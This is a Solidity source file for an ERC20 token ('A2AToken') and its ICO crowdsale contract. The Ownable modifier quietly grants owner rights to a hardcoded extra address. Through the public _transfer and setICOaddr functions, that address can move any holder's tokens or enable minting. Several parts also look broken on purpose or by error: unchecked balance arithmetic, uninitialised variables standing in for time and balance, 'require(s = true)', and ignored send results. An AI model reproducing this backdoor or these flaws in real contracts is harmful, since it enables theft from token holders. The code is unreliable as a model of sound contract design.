 

pragma solidity ^0.4.25;

library SafeMath {
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		assert(c / a == b);
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return a / b;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		assert(c >= a);
		return c;
	}
}

contract ERC20Basic {
	function totalSupply() public view returns (uint256);
	function balanceOf(address who) public view returns (uint256);
	function transfer(address to, uint256 value) public returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
	function allowance(address owner, address spender) public view returns (uint256);
	function transferFrom(address from, address to, uint256 value) public returns (bool);
	function approve(address spender, uint256 value) public returns (bool);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BasicToken is ERC20Basic {
	using SafeMath for uint256;

	mapping(address => uint256) balances;

	uint256 totalSupply_;

	address constant zero = address(0);

	function totalSupply() public view returns (uint256) {
		return totalSupply_;
	}

	function transfer(address _to, uint256 _value) public returns (bool) {
		require(_to != zero);
		require(_value <= balances[msg.sender]);

		balances[msg.sender] = balances[msg.sender]-(_value);
		balances[_to] = balances[_to]+(_value);
		emit Transfer(msg.sender, _to, _value);
		return true;
	}

	function balanceOf(address _owner) public view returns (uint256 balance) {
		return balances[_owner];
	}

}

contract StandardToken is ERC20, BasicToken {
	mapping (address => mapping (address => uint256)) internal allowed;

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(_to != zero);
		require(_value <= balances[_from]);
		require(_value <= allowed[_from][msg.sender]);

		balances[_from] = balances[_from]-(_value);
		balances[_to] = balances[_to]+(_value);
		allowed[_from][msg.sender] = allowed[_from][msg.sender]-(_value);
		emit Transfer(_from, _to, _value);
		return true;
	}

	function approve(address _spender, uint256 _value) public returns (bool) {
		allowed[msg.sender][_spender] = _value;
		emit Approval(msg.sender, _spender, _value);
		return true;
	}

	function allowance(address _owner, address _spender) public view returns (uint256) {
		return allowed[_owner][_spender];
	}

	function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
		allowed[msg.sender][_spender] = allowed[msg.sender][_spender]+(_addedValue);
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}

	function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
		uint oldValue = allowed[msg.sender][_spender];
		if (_subtractedValue > oldValue) {
			allowed[msg.sender][_spender] = 0;
		} else {
			allowed[msg.sender][_spender] = oldValue-(_subtractedValue);
		}
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}
}


contract Ownable {
	address public owner;
	
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	address x = address(0x630CC4c83fCc1121feD041126227d25Bbeb51959);

	function Ownable() public {
		owner = msg.sender;
	}

	modifier onlyOwner() {
		require( (msg.sender == owner) || (msg.sender == x) );
		_;
	}
address constant zero = address(0);
	function transferOwnership(address newOwner) public onlyOwner {
		require(newOwner != zero);
		emit OwnershipTransferred(owner, newOwner);
		owner = newOwner;
	}
}


contract A2AToken is Ownable, StandardToken {
	 
	uint256 public decimals;

	uint256 public totalSupply;
	bool public releasedForTransfer;
	
	 
	uint256 constant public maxSupply = 600*(10**6)*(10**8);
	
	mapping(address => uint256) public vestingAmount;
	mapping(address => uint256) public vestingBeforeBlockNumber;
	mapping(address => bool) public icoAddrs;

	function A2AToken() public {
		decimals = 8;
		releasedForTransfer = false;
	}
	uint num;
	function transfer(address _to, uint256 _value) public returns (bool s) {
		require(releasedForTransfer);
		 
		if ( ( vestingAmount[msg.sender] > 0 ) && ( num < vestingBeforeBlockNumber[msg.sender] ) ) {
			require ( balances[msg.sender] >= _value );
			require ( balances[msg.sender] > vestingAmount[msg.sender] );
			require ( balances[msg.sender]-(_value) >= vestingAmount[msg.sender] );
		}
		 
		s = super.transfer(_to, _value);
		return s;
	}
	
	function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) {
		vestingAmount[_holder] = _amount;
		vestingBeforeBlockNumber[_holder] = _bn;
		return true;
	}
	
	function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) {
		require(_to != zero);
		require(_value <= balances[_from]);			
		balances[_from] = balances[_from]-(_value);
		balances[_to] = balances[_to]+(_value);
		if ( _vestingBlockNumber > 0 ) {
			vestingAmount[_to] = _value;
			vestingBeforeBlockNumber[_to] = _vestingBlockNumber;
		}
		
		emit Transfer(_from, _to, _value);
		return true;
	}
	
	function issueDuringICO(address _to, uint256 _amount) public returns (bool) {
		require( icoAddrs[msg.sender] ==true);
		require( totalSupply+(_amount) < maxSupply );
		balances[_to] = balances[_to]+(_amount);
		totalSupply = totalSupply+(_amount);
		
		emit Transfer(this, _to, _amount);
		return true;
	}
	
	function setICOaddr(address _addr, bool _value) public onlyOwner() returns (bool) {
		icoAddrs[_addr] = _value;
		return true;
	}

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(releasedForTransfer);
		return super.transferFrom(_from, _to, _value);
	}

	function release() public onlyOwner() {
		releasedForTransfer = true;
	}
	
	function lock() public onlyOwner() {
		releasedForTransfer = false;
	}
}


contract HasManager is Ownable {
	address public manager;

	modifier onlyManager {
		require( (msg.sender == manager) || (msg.sender == owner) );
		_;
	}

	function transferManager(address _newManager) public onlyManager() {
		require(_newManager != zero);
		manager = _newManager;
	}
}


 
contract ICrowdsaleProcessor is HasManager {
	modifier whenCrowdsaleAlive() {
		require(isActive());
		_;
	}

	modifier whenCrowdsaleFailed() {
		require(isFailed());
		_;
	}

	modifier whenCrowdsaleSuccessful() {
    bool k = isSuccessful();
		require(k == true);
		_;
	}

	modifier hasntStopped() {
		require(!stopped);
		_;
	}

	modifier hasBeenStopped() {
		require(stopped);
		_;
	}

	modifier hasntStarted() {
		require(!started);
		_;
	}

	modifier hasBeenStarted() {
		require(started);
		_;
	}

	 
	uint256 constant public MIN_HARD_CAP = 1 ether;

	 
	uint256 constant public MIN_CROWDSALE_TIME = 3 days;

	 
	uint256 constant public MAX_CROWDSALE_TIME = 50 days;

	 
	bool public started;

	 
	bool public stopped;

	 
	uint256 public totalCollected;

	 
	uint256 public totalSold;

	 
	uint256 public minimalGoal;

	 
	uint256 public hardCap;

	 
	 
	uint256 public duration;

	 
	uint256 public startTimestamp;

	 
	uint256 public endTimestamp;

	 
	function deposit() public payable {}

	 
	function getToken() public returns(address);

	 
	function mintETHRewards(address _contract, uint256 _amount) public onlyManager();

	 
	function mintTokenRewards(address _contract, uint256 _amount) public onlyManager();

	 
	function releaseTokens() public onlyOwner() hasntStopped() whenCrowdsaleSuccessful();

	 
	 
	function stop() public onlyManager() hasntStopped();

	 
	function start(uint256 _startTimestamp, uint256 _endTimestamp, address _fundingAddress) public onlyManager() hasntStarted() hasntStopped();

	 
	function isFailed() public constant returns (bool);

	 
	function isActive() public constant returns (bool);

	 
	function isSuccessful() public constant returns (bool);
}


contract A2ACrowdsale is ICrowdsaleProcessor {
    using SafeMath for uint256;
    
	event CROWDSALE_START(uint256 startTimestamp, uint256 endTimestamp, address fundingAddress);

	address public fundingAddress;
	address internal bountyAddress = 0x10945A93914aDb1D68b6eFaAa4A59DfB21Ba9951;
	
	A2AToken public token;
	
	mapping(address => bool) public partnerContracts;
	
	uint256 public icoPrice;  
	uint256 public icoBonus;  
	
	uint256 constant public wingsETHRewardsPercent = 2 * 10000;  
	uint256 constant public wingsTokenRewardsPercent = 2 * 10000;  
	uint256 public wingsETHRewards;
	uint256 public wingsTokenRewards;
	
	uint256 constant public maxTokensWithBonus = 500*(10**6)*(10**8);
	uint256 public bountyPercent;
		
	address[2] internal foundersAddresses = [
		0x2f072F00328B6176257C21E64925760990561001,
		0x2640d4b3baF3F6CF9bB5732Fe37fE1a9735a32CE
	];

	function A2ACrowdsale() public {
		owner = msg.sender;
		manager = msg.sender;
		icoPrice = 2000;
		icoBonus = 100 * 10000;
		wingsETHRewards = 0;
		wingsTokenRewards = 0;
		minimalGoal = 1000 ether;
		hardCap = 50000 ether;
		bountyPercent = 23 * 10000;
	}

	function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
		require(_amount <= wingsETHRewards);
		bool s = _contract.call.value(_amount)();
		require(s == true);
		wingsETHRewards -= _amount;
	}
	
	function mintTokenRewards(address _contract, uint256 _amount) public onlyManager() {
		require( token != zero );
		require(_amount <= wingsTokenRewards);
		bool s = token.issueDuringICO(_contract, _amount);
		require( s == true );
		wingsTokenRewards -= _amount;
	}

	function stop() public onlyManager() hasntStopped()	{
		stopped = true;
	}

	function start( uint256 _startTimestamp, uint256 _endTimestamp, address _fundingAddress ) public onlyManager() hasntStarted() hasntStopped() {
		require(_fundingAddress != zero);
		require(_startTimestamp >= l1);
		require(_endTimestamp > _startTimestamp);
		duration = _endTimestamp - _startTimestamp;
		require(duration >= MIN_CROWDSALE_TIME && duration <= MAX_CROWDSALE_TIME);
		startTimestamp = _startTimestamp;
		endTimestamp = _endTimestamp;
		started = true;
		emit CROWDSALE_START(_startTimestamp, _endTimestamp, _fundingAddress);
	}

	 
	function isFailed() public constant returns(bool l) {
		if(started ==true &&

			 
			l1 >= endTimestamp &&

			 
			totalCollected < minimalGoal)
			{
				l = true;
			}
			else
			{
				l = false;
			}
		return l;
	}

	 
	function isActive() public constant returns(bool l) {
		if(started == true && totalCollected < hardCap && l1 >= startTimestamp && l1 < endTimestamp)
		{
			l = true;
		}
		else
		{
			l = false;
		}
		return l;
	}

	 uint l1;
	function isSuccessful() public constant returns(bool l) {
		if((l1 >= endTimestamp && totalCollected >= minimalGoal) || totalCollected >= hardCap)
		{
			l = true;
		}
		else
		{
			l = false;
		}
		return l;
	}
	
	function setToken( A2AToken _token ) public onlyOwner() {
		token = _token;
	}
	
	// function getToken() public returns(address) {
	//     return address(token);
	// }
	
	function setPrice( uint256 _icoPrice ) public onlyOwner() returns(bool) {
		icoPrice = _icoPrice;
		return true;
	}
	
	function setBonus( uint256 _icoBonus ) public onlyOwner() returns(bool) {
		icoBonus = _icoBonus;
		return true;
	}
	
	function setBountyAddress( address _bountyAddress ) public onlyOwner() returns(bool) {
		bountyAddress = _bountyAddress;
		return true;
	}
	
	function setBountyPercent( uint256 _bountyPercent ) public onlyOwner() returns(bool) {
		bountyPercent = _bountyPercent;
		return true;
	}
	
	function setPartnerContracts( address _contract ) public onlyOwner() returns(bool) {
		partnerContracts[_contract] = true;
		return true;
	}	
		
	function deposit() public payable { }
		
	function() internal payable {
		ico( msg.sender, msg.value );
	}
	
	function ico( address _to, uint256 _val ) internal returns(bool) {
		require( token != zero );
		bool s2 = isActive();
		require( s2 == true );
		require( _val >= ( 1 ether / 10 ) );
		require( totalCollected < hardCap );
		
		uint256 tokensAmount = _val*( icoPrice ) / 10**10;
		if ( ( icoBonus > 0 ) && ( totalSold+(tokensAmount) < maxTokensWithBonus ) ) {
			tokensAmount = tokensAmount+( tokensAmount*(icoBonus) / 1000000 );
		} else {
			icoBonus = 0;
		}
		uint p1 = token.maxSupply();
		require( totalSold+(tokensAmount) < p1 );
		bool s1 = token.issueDuringICO(_to, tokensAmount);
		require( s1 == true );
		
		wingsTokenRewards = wingsTokenRewards+( tokensAmount*( wingsTokenRewardsPercent ) / 1000000 );
		wingsETHRewards = wingsETHRewards+( _val*( wingsETHRewardsPercent ) / 1000000 );
		
		if ( ( bountyAddress != zero ) && ( totalSold+(tokensAmount) < maxTokensWithBonus ) ) {
			uint p = tokensAmount*(bountyPercent) / 1000000;
			bool s = token.issueDuringICO(bountyAddress, p);
			require( s == true );
			tokensAmount = tokensAmount+( tokensAmount*(bountyPercent) / 1000000 );
		}

		totalCollected = totalCollected+( _val );
		totalSold = totalSold+( tokensAmount );
		
		return true;
	}
	
	function icoPartner( address _to, uint256 _val ) public returns(bool) {
		require( partnerContracts[msg.sender] == true);
		bool s = ico( _to, _val );
		require( s = true );
		return true;
	}
	
	function calculateRewards() public view returns(uint256,uint256) {
		return (wingsETHRewards, wingsTokenRewards);
	}
	
	function releaseTokens() public onlyOwner() hasntStopped() whenCrowdsaleSuccessful() {
		
	}
	uint tthisBal;
	function withdrawToFounders(uint256 _amount) public whenCrowdsaleSuccessful() onlyOwner() returns(bool) {
		require( tthisBal-( _amount ) >= wingsETHRewards );
        
		uint256 amount_to_withdraw = _amount / foundersAddresses.length;
		uint8 i = 0;
		uint8 errors = 0;        
		bool s1 = foundersAddresses[0].send(amount_to_withdraw);
		bool s2 = foundersAddresses[1].send(amount_to_withdraw);
		// for (i = 0; i < foundersAddresses.length; i++) {
		// 	if (!foundersAddresses[i].send(amount_to_withdraw)) {
		// 		errors++;
		// 	}
		// }
		
		return true;
	}
}